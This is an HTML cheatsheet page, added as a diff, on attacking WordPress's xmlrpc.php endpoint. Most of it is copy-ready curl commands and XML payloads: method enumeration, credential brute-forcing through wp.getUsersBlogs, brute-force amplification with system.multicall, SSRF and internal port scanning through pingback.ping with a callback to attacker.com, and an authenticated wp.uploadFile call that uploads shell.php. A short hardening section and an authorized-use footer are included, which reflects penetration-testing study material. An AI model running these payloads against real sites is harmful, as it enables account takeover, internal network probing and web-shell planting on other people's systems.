@@ -1,0 +1,386 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>XML-RPC Abuse · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › WordPress</nav><h1>XML-RPC Abuse</h1><p class="cx-lede">The xmlrpc.php endpoint as an unauthenticated attack surface - method enumeration via system.listMethods, brute-force amplification via system.multicall, credential validation via wp.getUsersBlogs, and SSRF via pingback.ping.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1110.001, T1110.003, T1071.001</span><span class="cx-tag">D3FEND D3-NTA</span><span class="cx-tag">IMPACT CredentialTheft, InternalAccess</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>WordPress's <code>xmlrpc.php</code> is an XML-RPC API endpoint that predates the modern REST API but is still enabled on most installs because many plugins (Jetpack, WordPress mobile apps, Akismet, IFTTT integrations) depend on it. From an operator perspective, <code>xmlrpc.php</code> offers four primitives that <code>wp-login.php</code> doesn't:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Enumerate the available methods
+curl -sX POST -d &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;&#x27; \
+  http://target/xmlrpc.php
+
+# 2. Brute-force credentials (no CAPTCHA, no rate limit by default)
+curl -sX POST -d &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
+&lt;params&gt;&lt;param&gt;&lt;value&gt;admin&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;password&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;
+&lt;/methodCall&gt;&#x27; \
+  http://target/xmlrpc.php
+
+# 3. Amplify brute-force via system.multicall (1 HTTP request = many login attempts)
+curl -sX POST -d &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;methodCall&gt;&lt;methodName&gt;system.multicall&lt;/methodName&gt;...&lt;/methodCall&gt;&#x27; \
+  http://target/xmlrpc.php
+
+# 4. SSRF via pingback.ping - make WordPress connect to an arbitrary URL
+curl -sX POST -d &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;
+&lt;params&gt;&lt;param&gt;&lt;value&gt;http://internal-host:8080/&lt;/value&gt;&lt;/param&gt;
+&lt;param&gt;&lt;value&gt;http://target/?p=1&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;
+&lt;/methodCall&gt;&#x27; \
+  http://target/xmlrpc.php</code></pre></figure>
+<p>Success indicator: <code>system.listMethods</code> returns the method list (confirms XML-RPC enabled); <code>wp.getUsersBlogs</code> with valid creds returns an <code>isAdmin</code> struct; <code>pingback.ping</code> makes an outbound connection visible in your callback listener.</p>
+<h2 id="when-xml-rpc-is-reachable">When XML-RPC is reachable</h2>
+<p>XML-RPC is enabled by default on a fresh WordPress install. Check with a simple GET:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">curl -sI http://target/xmlrpc.php</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>HTTP/1.1 405 Method Not Allowed
+Allow: POST
+Server: Apache/2.4.41</code></pre></figure>
+<p>405 with <code>Allow: POST</code> confirms the endpoint exists and only accepts POST. A 404 means it's been deleted or rewritten away - some hardening guides recommend this.</p>
+<p>A 403 means a security plugin or web server rule is blocking access. Wordfence has an "Disable XML-RPC" option that returns 403; iThemes Security similarly.</p>
+<p>When XML-RPC is reachable, every method described below works without authentication for the method-discovery step; methods that need credentials enforce them per-method.</p>
+<h2 id="method-enumeration">Method enumeration</h2>
+<p>The <code>system.listMethods</code> method returns every XML-RPC method the server exposes:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">curl -sX POST -d &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;methodCall&gt;
+  &lt;methodName&gt;system.listMethods&lt;/methodName&gt;
+  &lt;params&gt;&lt;/params&gt;
+&lt;/methodCall&gt;&#x27; http://target/xmlrpc.php</code></pre></figure>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;methodResponse&gt;
+  &lt;params&gt;
+    &lt;param&gt;
+      &lt;value&gt;
+        &lt;array&gt;
+          &lt;data&gt;
+            &lt;value&gt;&lt;string&gt;system.multicall&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;system.listMethods&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;system.getCapabilities&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;demo.addTwoNumbers&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;demo.sayHello&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;pingback.extensions.getPingbacks&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;pingback.ping&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;mt.publishPost&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;mt.getRecentPostTitles&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;mt.getCategoryList&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;mt.getPostCategories&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;mt.setPostCategories&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;mt.supportedMethods&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;mt.supportedTextFilters&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;mt.getTrackbackPings&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;metaWeblog.newPost&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;metaWeblog.editPost&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;metaWeblog.getPost&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;metaWeblog.getRecentPosts&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;metaWeblog.getCategories&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;metaWeblog.newMediaObject&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;blogger.newPost&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;blogger.editPost&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;blogger.deletePost&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;blogger.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;blogger.getUserInfo&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;wp.newPost&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;wp.editPost&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;wp.deletePost&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;wp.getPosts&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;wp.uploadFile&lt;/string&gt;&lt;/value&gt;
+            ...
+          &lt;/data&gt;
+        &lt;/array&gt;
+      &lt;/value&gt;
+    &lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodResponse&gt;</code></pre></figure>
+<p>The method count varies (~70 in core WordPress; plugins like Jetpack add more). Methods worth recognizing:</p>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>What it does</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>system.listMethods</code></td>
+<td>Lists all methods</td>
+<td>No auth</td>
+</tr>
+<tr>
+<td><code>system.multicall</code></td>
+<td>Bundle multiple method calls in one HTTP request</td>
+<td>No auth wrapper; per-call auth applies</td>
+</tr>
+<tr>
+<td><code>pingback.ping</code></td>
+<td>Send a pingback notification</td>
+<td>No auth → SSRF</td>
+</tr>
+<tr>
+<td><code>pingback.extensions.getPingbacks</code></td>
+<td>List pingbacks for a URL</td>
+<td>Sometimes leaks internal post info</td>
+</tr>
+<tr>
+<td><code>wp.getUsersBlogs</code></td>
+<td>Returns the blogs a user has access to</td>
+<td>Credential validation primitive</td>
+</tr>
+<tr>
+<td><code>wp.getPosts</code></td>
+<td>Get posts (with optional auth)</td>
+<td>Sometimes reveals draft posts</td>
+</tr>
+<tr>
+<td><code>wp.uploadFile</code></td>
+<td>Upload media</td>
+<td>Author-or-above role required → file upload attack surface</td>
+</tr>
+<tr>
+<td><code>wp.newPost</code> / <code>wp.editPost</code></td>
+<td>Create/edit posts</td>
+<td>Author-or-above</td>
+</tr>
+<tr>
+<td><code>metaWeblog.newMediaObject</code></td>
+<td>Alternate upload</td>
+<td>Author-or-above</td>
+</tr>
+</tbody>
+</table>
+<h2 id="credential-validation-brute-force">Credential validation / brute-force</h2>
+<p>The classic XML-RPC brute-force uses <code>wp.getUsersBlogs</code>. The method takes a username and password and returns the blogs the user has access to (or an error if creds are wrong).</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">curl -sX POST -d &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;methodCall&gt;
+  &lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
+  &lt;params&gt;
+    &lt;param&gt;&lt;value&gt;admin&lt;/value&gt;&lt;/param&gt;
+    &lt;param&gt;&lt;value&gt;CorrectPassword&lt;/value&gt;&lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodCall&gt;&#x27; http://target/xmlrpc.php</code></pre></figure>
+<p>Successful response:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;methodResponse&gt;
+  &lt;params&gt;
+    &lt;param&gt;
+      &lt;value&gt;
+        &lt;array&gt;
+          &lt;data&gt;
+            &lt;value&gt;
+              &lt;struct&gt;
+                &lt;member&gt;&lt;name&gt;isAdmin&lt;/name&gt;&lt;value&gt;&lt;boolean&gt;1&lt;/boolean&gt;&lt;/value&gt;&lt;/member&gt;
+                &lt;member&gt;&lt;name&gt;url&lt;/name&gt;&lt;value&gt;&lt;string&gt;http://target/&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
+                &lt;member&gt;&lt;name&gt;blogid&lt;/name&gt;&lt;value&gt;&lt;string&gt;1&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
+                &lt;member&gt;&lt;name&gt;blogName&lt;/name&gt;&lt;value&gt;&lt;string&gt;Example&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
+                &lt;member&gt;&lt;name&gt;xmlrpc&lt;/name&gt;&lt;value&gt;&lt;string&gt;http://target/xmlrpc.php&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
+              &lt;/struct&gt;
+            &lt;/value&gt;
+          &lt;/data&gt;
+        &lt;/array&gt;
+      &lt;/value&gt;
+    &lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodResponse&gt;</code></pre></figure>
+<p>Failed response (wrong credentials):</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;methodResponse&gt;
+  &lt;fault&gt;
+    &lt;value&gt;
+      &lt;struct&gt;
+        &lt;member&gt;&lt;name&gt;faultCode&lt;/name&gt;&lt;value&gt;&lt;int&gt;403&lt;/int&gt;&lt;/value&gt;&lt;/member&gt;
+        &lt;member&gt;&lt;name&gt;faultString&lt;/name&gt;&lt;value&gt;&lt;string&gt;Incorrect username or password.&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
+      &lt;/struct&gt;
+    &lt;/value&gt;
+  &lt;/fault&gt;
+&lt;/methodResponse&gt;</code></pre></figure>
+<p>The differential is clear: response contains <code>&lt;isAdmin&gt;</code> → success; response contains <code>&lt;faultCode&gt;403&lt;/faultCode&gt;</code> → fail.</p>
+<h3 id="why-this-matters-vs-wp-loginphp-brute-force">Why this matters vs. wp-login.php brute-force</h3>
+<ul>
+<li><strong>No CAPTCHA.</strong> <code>wp-login.php</code> can have CAPTCHA via plugins; <code>xmlrpc.php</code> typically doesn't.</li>
+<li><strong>No CSRF token.</strong> <code>wp-login.php</code> may require a nonce; <code>xmlrpc.php</code> doesn't.</li>
+<li><strong>Sometimes no rate limiting.</strong> Many security plugins (especially older versions) protect <code>wp-login.php</code> but ignore <code>xmlrpc.php</code>. Hardening evolution has closed this gap somewhat but it's still common in older installs.</li>
+<li><strong><code>isAdmin</code> field tells you about role privilege immediately.</strong> Authors and editors will succeed too - useful for finding any-role-with-some-access accounts.</li>
+</ul>
+<p>WPScan uses this method when <code>--password-attack xmlrpc</code> is selected - see <a href="../login-bruteforce/index.html">Login brute-force</a>.</p>
+<h2 id="amplification-via-systemmulticall">Amplification via system.multicall</h2>
+<p><code>system.multicall</code> accepts an array of method calls and executes them in a single HTTP request:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;methodCall&gt;
+  &lt;methodName&gt;system.multicall&lt;/methodName&gt;
+  &lt;params&gt;
+    &lt;param&gt;
+      &lt;value&gt;
+        &lt;array&gt;
+          &lt;data&gt;
+            &lt;value&gt;&lt;struct&gt;
+              &lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
+              &lt;member&gt;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;
+                &lt;array&gt;&lt;data&gt;
+                  &lt;value&gt;&lt;array&gt;&lt;data&gt;
+                    &lt;value&gt;&lt;string&gt;admin&lt;/string&gt;&lt;/value&gt;
+                    &lt;value&gt;&lt;string&gt;password1&lt;/string&gt;&lt;/value&gt;
+                  &lt;/data&gt;&lt;/array&gt;&lt;/value&gt;
+                &lt;/data&gt;&lt;/array&gt;
+              &lt;/value&gt;&lt;/member&gt;
+            &lt;/struct&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;struct&gt;
+              &lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
+              &lt;member&gt;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;
+                &lt;array&gt;&lt;data&gt;
+                  &lt;value&gt;&lt;array&gt;&lt;data&gt;
+                    &lt;value&gt;&lt;string&gt;admin&lt;/string&gt;&lt;/value&gt;
+                    &lt;value&gt;&lt;string&gt;password2&lt;/string&gt;&lt;/value&gt;
+                  &lt;/data&gt;&lt;/array&gt;&lt;/value&gt;
+                &lt;/data&gt;&lt;/array&gt;
+              &lt;/value&gt;&lt;/member&gt;
+            &lt;/struct&gt;&lt;/value&gt;
+            &lt;!-- repeat for many passwords --&gt;
+          &lt;/data&gt;
+        &lt;/array&gt;
+      &lt;/value&gt;
+    &lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodCall&gt;</code></pre></figure>
+<p>Each inner struct is one method call. The server processes them sequentially and returns an array of results.</p>
+<p><strong>Operational impact:</strong> one HTTP request can contain ~hundreds of brute-force attempts. From a defender's perspective looking at HTTP request rate, it's a single request - much harder to rate-limit than 100 separate POSTs to <code>wp-login.php</code>. WordPress added a limit (~150 calls per multicall) in 4.4 but many installs run older versions.</p>
+<p>The response is a long XML array. Parsing it for successes:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Extract just the successful (isAdmin) responses
+curl -sX POST -d &quot;@multicall_payload.xml&quot; http://target/xmlrpc.php \
+  | grep -B1 -A20 &#x27;isAdmin&#x27; \
+  | grep -E &#x27;&lt;string&gt;password|&lt;boolean&gt;1&#x27;</code></pre></figure>
+<h2 id="ssrf-via-pingbackping">SSRF via pingback.ping</h2>
+<p>The <code>pingback.ping</code> method is intended to notify a third-party blog that you've linked to one of its posts. It takes two arguments: the source URL (your blog post) and the target URL (the post you linked to).</p>
+<p>What it actually does on the server side: WordPress fetches the source URL via HTTP to verify the link exists. <strong>The source URL can be anywhere - including internal hosts the target server can reach but you can't.</strong></p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">curl -sX POST -d &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;methodCall&gt;
+  &lt;methodName&gt;pingback.ping&lt;/methodName&gt;
+  &lt;params&gt;
+    &lt;param&gt;&lt;value&gt;&lt;string&gt;http://attacker.com/callback&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+    &lt;param&gt;&lt;value&gt;&lt;string&gt;http://target/?p=1&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodCall&gt;&#x27; http://target/xmlrpc.php</code></pre></figure>
+<p>If <code>attacker.com/callback</code> receives an inbound HTTP request shortly afterward, the SSRF works. The User-Agent will be <code>WordPress/X.Y.Z; http://target/...</code> - clearly identifies it.</p>
+<h3 id="using-ssrf-for-internal-scanning">Using SSRF for internal scanning</h3>
+<p>Replace the source URL with internal addresses:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Probe an internal web service
+curl -sX POST -d &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;methodCall&gt;
+  &lt;methodName&gt;pingback.ping&lt;/methodName&gt;
+  &lt;params&gt;
+    &lt;param&gt;&lt;value&gt;&lt;string&gt;http://10.0.0.5:8080/admin&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+    &lt;param&gt;&lt;value&gt;&lt;string&gt;http://target/?p=1&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodCall&gt;&#x27; http://target/xmlrpc.php</code></pre></figure>
+<p>Response patterns (in the <code>faultString</code> field):</p>
+<table>
+<thead>
+<tr>
+<th>Fault content</th>
+<th>What it means</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>The source URL does not contain a link to the target URL</code></td>
+<td>Internal host returned content but no link → host is up, port is open, returns content</td>
+</tr>
+<tr>
+<td><code>is not a valid URL</code></td>
+<td>Malformed URL on your end</td>
+</tr>
+<tr>
+<td><code>couldn't open</code> (or similar timeout)</td>
+<td>Connection refused or timeout → port closed or filtered</td>
+</tr>
+<tr>
+<td><code>Pingback already registered</code></td>
+<td>The pingback already fired once (you'll get this on retries)</td>
+</tr>
+</tbody>
+</table>
+<p>The differential between "fetched something" and "couldn't fetch anything" is the port-scan oracle.</p>
+<h3 id="why-this-still-works">Why this still works</h3>
+<p>WordPress disabled the source-port discovery aspect of pingback but the URL-fetch behavior remains intact because it's required for legitimate pingback functionality. Mitigations exist:</p>
+<ul>
+<li>WordPress 3.5.1 added Akismet integration that filters pingbacks</li>
+<li>Hosting providers sometimes filter outbound HTTP from WordPress</li>
+<li>Plugins like Wordfence can disable <code>pingback.ping</code> specifically</li>
+</ul>
+<p>When pingback SSRF is alive, it's a useful internal-network probe. See the <a href="../../server-side/ssrf/index.html">SSRF cluster</a> for the broader context on SSRF primitives.</p>
+<h3 id="reflective-dos-via-pingback">Reflective DoS via pingback</h3>
+<p>Multiple WordPress sites with <code>pingback.ping</code> open can be coerced into hammering a third-party target - many sources, one victim. Historically used in DDoS amplification.</p>
+<p>This is out of scope for offensive pentest work (DoS testing requires explicit permission and is rarely useful for defensive value), but it's the reason WordPress.com disabled pingbacks across the board in 2014 and the reason hardening guides recommend disabling them.</p>
+<h2 id="other-useful-xml-rpc-methods">Other useful XML-RPC methods</h2>
+<h3 id="wpuploadfile-authenticated-arbitrary-upload"><code>wp.uploadFile</code> - authenticated arbitrary upload</h3>
+<p>Once you have credentials (any role above Subscriber), this method uploads a file to <code>wp-content/uploads/</code>:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;methodCall&gt;
+  &lt;methodName&gt;wp.uploadFile&lt;/methodName&gt;
+  &lt;params&gt;
+    &lt;param&gt;&lt;value&gt;&lt;string&gt;1&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;             &lt;!-- blog_id --&gt;
+    &lt;param&gt;&lt;value&gt;&lt;string&gt;username&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+    &lt;param&gt;&lt;value&gt;&lt;string&gt;password&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+    &lt;param&gt;
+      &lt;value&gt;
+        &lt;struct&gt;
+          &lt;member&gt;&lt;name&gt;name&lt;/name&gt;&lt;value&gt;&lt;string&gt;shell.php&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
+          &lt;member&gt;&lt;name&gt;type&lt;/name&gt;&lt;value&gt;&lt;string&gt;image/png&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
+          &lt;member&gt;&lt;name&gt;bits&lt;/name&gt;&lt;value&gt;&lt;base64&gt;BASE64_ENCODED_PHP_HERE&lt;/base64&gt;&lt;/value&gt;&lt;/member&gt;
+          &lt;member&gt;&lt;name&gt;overwrite&lt;/name&gt;&lt;value&gt;&lt;boolean&gt;0&lt;/boolean&gt;&lt;/value&gt;&lt;/member&gt;
+        &lt;/struct&gt;
+      &lt;/value&gt;
+    &lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodCall&gt;</code></pre></figure>
+<p>WordPress validates <code>name</code> extensions against a whitelist; <code>.php</code> is rejected. But the validation has historically had bypass techniques (double extensions, null byte injection in old WP, custom upload-handler plugins that don't validate). See the <a href="../../uploads/index.html">file upload cluster</a> for bypass techniques.</p>
+<p>When <code>wp.uploadFile</code> is reachable with author-level credentials, it's an Author → RCE path that doesn't require the admin theme editor.</p>
+<h3 id="metaweblognewpost-authenticated-post-creation"><code>metaWeblog.newPost</code> - authenticated post creation</h3>
+<p>Lets you create posts as the authenticated user. Less directly useful for RCE but useful for:</p>
+<ul>
+<li>Posting content that triggers stored XSS to other users</li>
+<li>Embedding shortcodes that execute server-side code (if a vulnerable plugin registers such a shortcode)</li>
+</ul>
+<h2 id="hardening-responses">Hardening responses</h2>
+<p>WordPress lets admins disable XML-RPC. Common approaches:</p>
+<ol>
+<li><strong>Block the endpoint at the web server level</strong> - <code>.htaccess</code> or nginx rule denying <code>xmlrpc.php</code></li>
+<li><strong>Disable XML-RPC via plugin</strong> - Wordfence, iThemes Security, "Disable XML-RPC" plugin</li>
+<li><strong>Filter specific methods</strong> - <code>xmlrpc_methods</code> WordPress filter removes individual methods (e.g., <code>pingback.ping</code>) while leaving others</li>
+</ol>
+<p>When XML-RPC returns 403/404, fall back to <code>wp-login.php</code> for brute-force and to other SSRF primitives for internal probes.</p>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Body of POST to xmlrpc.php</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Check endpoint</td>
+<td><code>curl -sI http://target/xmlrpc.php</code> (expect 405 with <code>Allow: POST</code>)</td>
+</tr>
+<tr>
+<td>List all methods</td>
+<td><code>&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;</code></td>
+</tr>
+<tr>
+<td>Test credentials</td>
+<td><code>&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;USER&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;PASS&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;</code></td>
+</tr>
+<tr>
+<td>Amplified brute-force</td>
+<td><code>&lt;methodCall&gt;&lt;methodName&gt;system.multicall&lt;/methodName&gt;...&lt;/methodCall&gt;</code> with N wp.getUsersBlogs structs</td>
+</tr>
+<tr>
+<td>SSRF / port probe</td>
+<td><code>&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;http://INTERNAL/&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;http://target/?p=1&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;</code></td>
+</tr>
+<tr>
+<td>Authenticated upload</td>
+<td><code>&lt;methodCall&gt;&lt;methodName&gt;wp.uploadFile&lt;/methodName&gt;...&lt;/methodCall&gt;</code></td>
+</tr>
+</tbody>
+</table></article><nav class="cx-pager"><a class="cx-prev" href="../user-enumeration/index.html">Previous: User Enumeration</a><a class="cx-next" href="../login-bruteforce/index.html">Next: Login Brute-Force</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
